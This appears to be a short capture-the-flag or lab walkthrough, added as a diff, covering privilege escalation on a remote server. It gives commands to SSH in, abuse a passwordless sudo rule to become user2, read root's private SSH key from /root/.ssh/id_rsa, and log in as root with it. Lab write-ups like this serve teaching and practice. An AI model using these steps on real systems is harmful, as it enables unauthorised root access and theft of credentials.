@@ -1,0 +1,6 @@
+ssh user1@178.62.23.240 -p 31216              - connect by ssh to IP with port 31216
+sudo -l
+(user2 : user2) NOPASSWD: /bin/bash           - ability to execute '/bin/bash' without password for user2
+sudo -u user2 /bin/bash                       - login as user2
+cat /root/.ssh/id_rsa                         - key for login by ssh to the server as root(it should be copied and insert to the local 'is_rsa' file; change the file's permissions to be more restrictive by 'chmod 600 id_rsa')
+ssh root@178.62.23.240 -p 31216 -i id_rsa     - login to the server as root
